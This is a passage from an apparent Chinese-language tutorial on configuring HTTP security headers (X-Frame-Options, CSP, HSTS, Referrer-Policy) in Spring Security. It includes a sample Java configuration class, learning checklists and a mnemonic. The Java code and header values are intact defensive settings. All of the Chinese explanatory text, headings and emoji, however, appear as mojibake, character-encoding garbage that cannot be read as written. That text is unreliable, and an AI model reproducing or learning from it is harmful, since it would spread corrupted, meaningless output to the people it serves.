åŸå› ï¼šX-Frame-Options: DENYé˜»æ­¢æ‰€æœ‰åµŒå…¥

è§£å†³æ–¹æ¡ˆï¼š
1. å¦‚æœå¿…é¡»è¢«åµŒå…¥ï¼Œæ”¹ä¸ºSAMEORIGINæˆ–ç§»é™¤
2. ä½¿ç”¨CSPçš„frame-ancestorsæ›´çµæ´»
   Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

### 10.4 å¿«é€Ÿé…ç½®æ¨¡æ¿


**âš¡ å¤åˆ¶å³ç”¨çš„å®Œæ•´é…ç½®**

```java
@Configuration
@EnableWebSecurity
public class QuickSecurityHeadersConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(h -> h
            .frameOptions(f -> f.deny())
            .contentTypeOptions(c -> {})
            .xssProtection(x -> x.enable().block(true))
            .contentSecurityPolicy(csp -> csp.policyDirectives(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data: https:; " +
                "font-src 'self'; " +
                "frame-ancestors 'none'"
            ))
            .httpStrictTransportSecurity(hsts -> hsts
                .maxAgeInSeconds(31536000)
                .includeSubDomains(true)
            )
            .referrerPolicy(r -> r.policy(
                ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN
            ))
        );
        return http.build();
    }
}
```

### 10.5 å­¦ä¹ æ£€æŸ¥æ¸…å•


**â˜‘ï¸ çŸ¥è¯†ç‚¹æŒæ¡æ£€æŸ¥**

```
â–¡ ç†è§£æ¯ä¸ªå®‰å…¨å¤´éƒ¨çš„ä½œç”¨
â–¡ çŸ¥é“å¦‚ä½•é…ç½®X-Frame-Optionsé˜²æ­¢ç‚¹å‡»åŠ«æŒ
â–¡ æŒæ¡CSPçš„åŸºæœ¬æŒ‡ä»¤å’Œé…ç½®æ–¹æ³•
â–¡ ç†è§£HSTSçš„å·¥ä½œåŸç†å’Œé…ç½®å‚æ•°
â–¡ äº†è§£Referrer-Policyçš„éšç§ä¿æŠ¤ä½œç”¨
â–¡ èƒ½å¤Ÿåœ¨Spring Securityä¸­é…ç½®æ‰€æœ‰å®‰å…¨å¤´éƒ¨
â–¡ ä¼šé’ˆå¯¹ä¸åŒç¯å¢ƒä½¿ç”¨ä¸åŒé…ç½®
â–¡ èƒ½å¤Ÿæµ‹è¯•å’ŒéªŒè¯å®‰å…¨å¤´éƒ¨æ˜¯å¦ç”Ÿæ•ˆ
â–¡ çŸ¥é“å¸¸è§é—®é¢˜çš„è§£å†³æ–¹æ³•
```

**ğŸ¯ å®æˆ˜èƒ½åŠ›æ£€æŸ¥**

```
â–¡ èƒ½ä¸ºæ–°é¡¹ç›®å¿«é€Ÿé…ç½®åŸºæœ¬å®‰å…¨å¤´éƒ¨
â–¡ èƒ½æ ¹æ®ä¸šåŠ¡éœ€æ±‚å®šåˆ¶CSPç­–ç•¥
â–¡ èƒ½è§£å†³CSPé…ç½®å¯¼è‡´çš„æ ·å¼/è„šæœ¬é—®é¢˜
â–¡ èƒ½ä¸ºHTTPSç½‘ç«™æ­£ç¡®é…ç½®HSTS
â–¡ èƒ½å¤„ç†å¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒçš„é…ç½®å·®å¼‚
â–¡ èƒ½ä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·éªŒè¯å®‰å…¨å¤´éƒ¨
```

---

## ğŸ’¡ è®°å¿†å£è¯€


```
ğŸ›¡ï¸ HTTPå®‰å…¨å¤´ï¼Œç½‘ç«™é˜²æŠ¤å¢™
   Frame-Optionsé˜²åŠ«æŒï¼ŒCSPé˜»è„šæœ¬
   Content-Typeè¦ä¸¥æ ¼ï¼ŒHSTSå¼ºåŠ å¯†
   Referreræ§éšç§ï¼ŒåŠŸèƒ½ç­–ç•¥é™æƒé™
   
ğŸ”§ Springé…ç½®ç®€å•åš
   headersæ–¹æ³•ç»Ÿä¸€ç®¡
   ç¯å¢ƒå·®å¼‚è¦åŒºåˆ†ï¼Œæµ‹è¯•éªŒè¯ä¸èƒ½å¿˜
```

**æ ¸å¿ƒè®°ä½**ï¼š
- **X-Frame-Options**ï¼šé˜²åµŒå…¥ â†’ `DENY`
- **CSP**ï¼šé˜²XSS â†’ ç™½åå•ç­–ç•¥
- **HSTS**ï¼šå¼ºåˆ¶HTTPS â†’ `max-age` + `includeSubDomains`
- **Referrer-Policy**ï¼šä¿æŠ¤éšç§ â†’ `strict-origin-when-cross-origin`